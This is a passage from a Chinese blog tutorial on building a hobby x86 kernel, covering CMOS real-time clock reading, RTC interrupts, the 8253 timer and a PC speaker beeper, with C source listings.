class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 已经过完的月份的时间</span></span><br><span class="line">    res += month[time-&gt;tm_mon] * DAY;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 2 月已经过了，并且当前不是闰年，那么减去一天</span></span><br><span class="line">    <span class="keyword">if</span> (time-&gt;tm_mon &gt; <span class="number">2</span> &amp;&amp; ((year + <span class="number">2</span>) % <span class="number">4</span>))</span><br><span class="line">        res -= DAY;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个月已经过去的天</span></span><br><span class="line">    res += DAY * (time-&gt;tm_mday - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 今天过去的小时</span></span><br><span class="line">    res += HOUR * time-&gt;tm_hour;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个小时过去的分钟</span></span><br><span class="line">    res += MINUTE * time-&gt;tm_min;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个分钟过去的秒</span></span><br><span class="line">    res += time-&gt;tm_sec;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_yday</span><span class="params">(tm *time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> res = month[time-&gt;tm_mon]; <span class="comment">// 已经过去的月的天数</span></span><br><span class="line">    res += time-&gt;tm_mday;          <span class="comment">// 这个月过去的天数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="keyword">if</span> (time-&gt;tm_year &gt;= <span class="number">70</span>)</span><br><span class="line">        year = time-&gt;tm_year - <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        year = time-&gt;tm_year - <span class="number">70</span> + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不是闰年，并且 2 月已经过去了，则减去一天</span></span><br><span class="line">    <span class="comment">// 注：1972 年是闰年，这样算不太精确，忽略了 100 年的平年</span></span><br><span class="line">    <span class="keyword">if</span> ((year + <span class="number">2</span>) % <span class="number">4</span> &amp;&amp; time-&gt;tm_mon &gt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">time_read_bcd</span><span class="params">(tm *time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// CMOS 的访问速度很慢。为了减小时间误差，在读取了下面循环中所有数值后，</span></span><br><span class="line">    <span class="comment">// 若此时 CMOS 中秒值发生了变化，那么就重新读取所有值。</span></span><br><span class="line">    <span class="comment">// 这样内核就能把与 CMOS 的时间误差控制在 1 秒之内。</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        time-&gt;tm_sec = cmos_read(CMOS_SECOND);</span><br><span class="line">        time-&gt;tm_min = cmos_read(CMOS_MINUTE);</span><br><span class="line">        time-&gt;tm_hour = cmos_read(CMOS_HOUR);</span><br><span class="line">        time-&gt;tm_wday = cmos_read(CMOS_WEEKDAY);</span><br><span class="line">        time-&gt;tm_mday = cmos_read(CMOS_DAY);</span><br><span class="line">        time-&gt;tm_mon = cmos_read(CMOS_MONTH);</span><br><span class="line">        time-&gt;tm_year = cmos_read(CMOS_YEAR);</span><br><span class="line">        century = cmos_read(CMOS_CENTURY);</span><br><span class="line">    &#125; <span class="keyword">while</span> (time-&gt;tm_sec != cmos_read(CMOS_SECOND));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">time_read</span><span class="params">(tm *time)</span></span><br><span class="line">&#123;</span><br><span class="line">    time_read_bcd(time);</span><br><span class="line">    time-&gt;tm_sec = bcd_to_bin(time-&gt;tm_sec);</span><br><span class="line">    time-&gt;tm_min = bcd_to_bin(time-&gt;tm_min);</span><br><span class="line">    time-&gt;tm_hour = bcd_to_bin(time-&gt;tm_hour);</span><br><span class="line">    time-&gt;tm_wday = bcd_to_bin(time-&gt;tm_wday);</span><br><span class="line">    time-&gt;tm_mday = bcd_to_bin(time-&gt;tm_mday);</span><br><span class="line">    time-&gt;tm_mon = bcd_to_bin(time-&gt;tm_mon);</span><br><span class="line">    time-&gt;tm_year = bcd_to_bin(time-&gt;tm_year);</span><br><span class="line">    time-&gt;tm_yday = get_yday(time);</span><br><span class="line">    time-&gt;tm_isdst = <span class="number">-1</span>;</span><br><span class="line">    century = bcd_to_bin(century);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">time_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    tm time;</span><br><span class="line">    time_read(&amp;time);</span><br><span class="line">    startup_time = mktime(&amp;time);</span><br><span class="line">    LOGK(<span class="string">&quot;startup time: %d%d-%02d-%02d %02d:%02d:%02d\n&quot;</span>,</span><br><span class="line">         century,</span><br><span class="line">         time.tm_year,</span><br><span class="line">         time.tm_mon,</span><br><span class="line">         time.tm_mday,</span><br><span class="line">         time.tm_hour,</span><br><span class="line">         time.tm_min,</span><br><span class="line">         time.tm_sec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">u8 <span class="title function_">bcd_to_bin</span><span class="params">(u8 value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (value &amp; <span class="number">0xf</span>) + (value &gt;&gt; <span class="number">4</span>) *<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">u8 <span class="title function_">bin_to_bcd</span><span class="params">(u8 value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (value / <span class="number">10</span>)*<span class="number">0x10</span> + (value % <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本上就是调用上述接口就可以实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">console_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">gdt_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">clock_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">time_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">rtc_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">hang</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    gdt_init();</span><br><span class="line">    interrupt_init();</span><br><span class="line">    time_init();</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;</span><br><span class="line">    hang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makefile的qemu选项里面加上<code>-rtc base=localtime</code>，就可以得到当前时区时间，就不需要我们手动计算了</p><p><img src="https://img.joe1sn.top/uploads/big/6bbe21386e50ce76c68bf9092dae5699.png" alt="image-20220322164422172" /></p><p>动态时钟就需要对RTC进行更多操作</p><p>而且我们对RTC的基本操作很少</p><p><code>src/include/xsys/rtc.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_RTC_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_RTC_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_alarm</span><span class="params">(u32 secs)</span>;</span><br><span class="line">u8 <span class="title function_">cmos_read</span><span class="params">(u8 addr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cmos_write</span><span class="params">(u8 addr, u8 value)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/rtc.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/interrupt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGK(fmt, args...) DEBUGK(fmt, ##args)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_ADDR 0x70 <span class="comment">// CMOS 地址寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_DATA 0x71 <span class="comment">// CMOS 数据寄存器</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_SECOND 0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_MINUTE 0x03</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_HOUR 0x05</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_A 0x0a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_B 0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_C 0x0c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_D 0x0d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMOS_NMI 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读 cmos 寄存器的值</span></span><br><span class="line">u8 <span class="title function_">cmos_read</span><span class="params">(u8 addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    outb(CMOS_ADDR, CMOS_NMI | addr);</span><br><span class="line">    <span class="keyword">return</span> inb(CMOS_DATA);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写 cmos 寄存器的值</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cmos_write</span><span class="params">(u8 addr, u8 value)</span></span><br><span class="line">&#123;</span><br><span class="line">    outb(CMOS_ADDR, CMOS_NMI | addr);</span><br><span class="line">    outb(CMOS_DATA, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="keyword">volatile</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实时时钟中断处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rtc_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 实时时钟中断向量号</span></span><br><span class="line">    assert(<span class="built_in">vector</span> == <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向中断控制器发送中断处理完成的信号</span></span><br><span class="line">    send_eoi(<span class="built_in">vector</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读 CMOS 寄存器 C，允许 CMOS 继续产生中断</span></span><br><span class="line">    cmos_read(CMOS_C);</span><br><span class="line"></span><br><span class="line">    set_alarm(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    LOGK(<span class="string">&quot;rtc handler %d...\n&quot;</span>, counter++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 secs 秒后发生实时时钟中断</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_alarm</span><span class="params">(u32 secs)</span></span><br><span class="line">&#123;</span><br><span class="line">    tm time;</span><br><span class="line">    time_read(&amp;time);</span><br><span class="line"></span><br><span class="line">    u8 sec = secs % <span class="number">60</span>;</span><br><span class="line">    secs /= <span class="number">60</span>;</span><br><span class="line">    u8 min = secs % <span class="number">60</span>;</span><br><span class="line">    secs /= <span class="number">60</span>;</span><br><span class="line">    u32 hour = secs;</span><br><span class="line"></span><br><span class="line">    time.tm_sec += sec;</span><br><span class="line">    <span class="keyword">if</span> (time.tm_sec &gt;= <span class="number">60</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        time.tm_sec %= <span class="number">60</span>;</span><br><span class="line">        time.tm_min += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    time.tm_min += min;</span><br><span class="line">    <span class="keyword">if</span> (time.tm_min &gt;= <span class="number">60</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        time.tm_min %= <span class="number">60</span>;</span><br><span class="line">        time.tm_hour += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    time.tm_hour += hour;</span><br><span class="line">    <span class="keyword">if</span> (time.tm_hour &gt;= <span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        time.tm_hour %= <span class="number">24</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cmos_write(CMOS_HOUR, bin_to_bcd(time.tm_hour));</span><br><span class="line">    cmos_write(CMOS_MINUTE, bin_to_bcd(time.tm_min));</span><br><span class="line">    cmos_write(CMOS_SECOND, bin_to_bcd(time.tm_sec));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rtc_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    u8 prev;</span><br><span class="line"></span><br><span class="line">    cmos_write(CMOS_B, <span class="number">0b01000010</span>); <span class="comment">// 打开周期中断</span></span><br><span class="line">    <span class="comment">// cmos_write(CMOS_B, 0b00100010); // 打开闹钟中断</span></span><br><span class="line">    cmos_read(CMOS_C); <span class="comment">// 读 C 寄存器，以允许 CMOS 中断</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set_alarm(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置中断频率</span></span><br><span class="line">    outb(CMOS_A, (inb(CMOS_A) &amp; <span class="number">0xf</span>) | <span class="number">0b1110</span>);</span><br><span class="line"></span><br><span class="line">    set_interrupt_handler(IRQ_RTC, rtc_handler);</span><br><span class="line">    set_interrupt_mask(IRQ_RTC, <span class="literal">true</span>);</span><br><span class="line">    set_interrupt_mask(IRQ_CASCADE, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>着重说一下rtc_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rtc_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    u8 prev;</span><br><span class="line"></span><br><span class="line">    cmos_write(CMOS_B, <span class="number">0b01000010</span>); <span class="comment">// 打开周期中断</span></span><br><span class="line">    <span class="comment">// cmos_write(CMOS_B, 0b00100010); // 打开闹钟中断</span></span><br><span class="line">    cmos_read(CMOS_C); <span class="comment">// 读 C 寄存器，以允许 CMOS 中断</span></span><br><span class="line">    <span class="comment">// set_alarm(2);</span></span><br><span class="line">    <span class="comment">// 设置中断频率</span></span><br><span class="line">    outb(CMOS_A, (inb(CMOS_A) &amp; <span class="number">0xf</span>) | <span class="number">0b1110</span>);</span><br><span class="line"></span><br><span class="line">    set_interrupt_handler(IRQ_RTC, rtc_handler);</span><br><span class="line">    set_interrupt_mask(IRQ_RTC, <span class="literal">true</span>);</span><br><span class="line">    set_interrupt_mask(IRQ_CASCADE, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cmos_write(CMOS_B, 0b01000010); // 打开周期中断</code>是单纯的基本中断，即CMOS按照其固定的时间刷新</p><p><img src="https://img.joe1sn.top/uploads/big/6623065d8494e83961159c4908e2f4ea.png" alt="image-20220322164809678" /></p><p><code>cmos_write(CMOS_B, 0b00100010);</code>我们就可以设置每次中断发生的时间，比如上面注释掉的<code>set_alarm(2);</code>就是中断每2s发生一次</p><p><img src="https://img.joe1sn.top/uploads/big/93e2eacd64b2a7c3bb98fe97ed72896c.png" alt="image-20220322165044877" /></p><p>两个数值(功能)的选择可以从8256芯片的级联图中看出</p><h3 id="时钟中断"><a class="markdownIt-Anchor" href="#时钟中断"></a> 时钟中断</h3><blockquote><p>常用的可编程定时计数器 (Programmable Interval Timer PIT) 有 Intel 8253/8254，其中 8254 可以称为 8253 的增强版。</p><p>在 8253 内部有 3 个独立的计数器，分别是计数器 0 ~ 2，端口号分别为 0x40 ~ 0x42；每个计数器完全相同，都是 16 位大小，相互独立，互不干涉。</p><p>8253 计数器是个减法计数器，从初值寄存器中得到初值，然后载入计数器中，然后随着时钟变化递减。计数器初值寄存器，计数器执行寄存器，和输出锁存器都是 16 位的寄存器，高八位和低八位可以单独访问。</p><p>计数器 0 用于产生时钟中断，就是连接在 IRQ0 引脚上的时钟，也就是控制计数器 0 可以控制时钟发生的频率，以改变时间片的间隔；</p></blockquote><p>控制字结构：</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>SC1</td><td>SC0</td><td>RL1</td><td>RL0</td><td>M2</td><td>M1</td><td>M0</td><td>BCD</td></tr></tbody></table><p>三个计数器有自己各自的用途：</p><ul><li><p>计数器 0，端口号 0x40，用于产生时钟信号，它采用工作方式 3；</p></li><li><p>计数器 1，端口号 0x41，用于 DRAM 的定时刷新控制；</p></li><li><p>计数器 2，端口号 0x42，用于内部扬声器发出不同音调的声音，原理是给扬声器输送某频率的方波；</p></li></ul><p><code>src/kernel/clock.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/interrupt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIT_CHAN0_REG 0X40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIT_CHAN2_REG 0X42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIT_CTRL_REG 0X43</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clock_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(<span class="built_in">vector</span> == <span class="number">0x20</span>);</span><br><span class="line">    send_eoi(<span class="built_in">vector</span>);</span><br><span class="line"></span><br><span class="line">    jiffies++;</span><br><span class="line">    DEBUGK(<span class="string">&quot;clock jiffies %d ...\n&quot;</span>, jiffies);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pit_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 配置计数器 0 时钟</span></span><br><span class="line">    outb(PIT_CTRL_REG, <span class="number">0b00110100</span>);</span><br><span class="line">    outb(PIT_CHAN0_REG, CLOCK_COUNTER &amp; <span class="number">0xff</span>);</span><br><span class="line">    outb(PIT_CHAN0_REG, (CLOCK_COUNTER &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clock_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    pit_init();</span><br><span class="line">    set_interrupt_handler(IRQ_CLOCK, clock_handler);</span><br><span class="line">    set_interrupt_mask(IRQ_CLOCK, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ac45100c17d232cf4f31fae8548feea9.png" alt="image-20220322171044770" /></p><p>但是这个例子没什么实际的东西，我们看到的也只有上面不断显示的字符，下面就有了更好的体验</p><h3 id="蜂鸣器"><a class="markdownIt-Anchor" href="#蜂鸣器"></a> 蜂鸣器</h3><p>由PIT我们可以设置方波来发出声音，要添加一些东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HZ 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OSCILLATOR 1193182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOCK_COUNTER (OSCILLATOR / HZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JIFFY (1000 / HZ)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPEAKER_REG 0x61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BEEP_HZ 440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BEEP_COUNTER (OSCILLATOR / BEEP_HZ)</span></span><br><span class="line"></span><br><span class="line">u32 <span class="keyword">volatile</span> jiffies = <span class="number">0</span>;</span><br><span class="line">u32 jiffy = JIFFY;</span><br><span class="line"></span><br><span class="line">u32 <span class="keyword">volatile</span> beeping = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">start_beep</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!beeping)</span><br><span class="line">    &#123;</span><br><span class="line">        outb(SPEAKER_REG, inb(SPEAKER_REG) | <span class="number">0b11</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    beeping = jiffies + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stop_beep</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (beeping &amp;&amp; jiffies &gt; beeping)</span><br><span class="line">    &#123;</span><br><span class="line">        outb(SPEAKER_REG, inb(SPEAKER_REG) &amp; <span class="number">0xfc</span>);</span><br><span class="line">        beeping = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时修改clock_handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">clock_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(<span class="built_in">vector</span> == <span class="number">0x20</span>);</span><br><span class="line">    send_eoi(<span class="built_in">vector</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(jiffies % <span class="number">200</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        start_beep();</span><br><span class="line">    &#125;</span><br><span class="line">    jiffies++;</span><br><span class="line">    DEBUGK(<span class="string">&quot;clock beep %d ...\n&quot;</span>, jiffies);</span><br><span class="line"></span><br><span class="line">    stop_beep();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在qemu上发声我的不知道是什么原因不行，但是导出在VMware上就可以了</p><p><img src="https://img.joe1sn.top/uploads/big/4a29656ab690da0dc86a9d95814dfc95.png" alt="image-20220322171908376" /></p><h2 id="软中断"><a class="markdownIt-Anchor" href="#软中断"></a> 软中断</h2><p>这个里面就包括了最开始说的除0异常。软中断是发生在计算机内部的中断信号，是由执行指令引起的</p><p><a href="https://blog.joe1sn.top/2022/03/10/os-interrupt/">操作系统实现-中断与系统调用</a>和<a 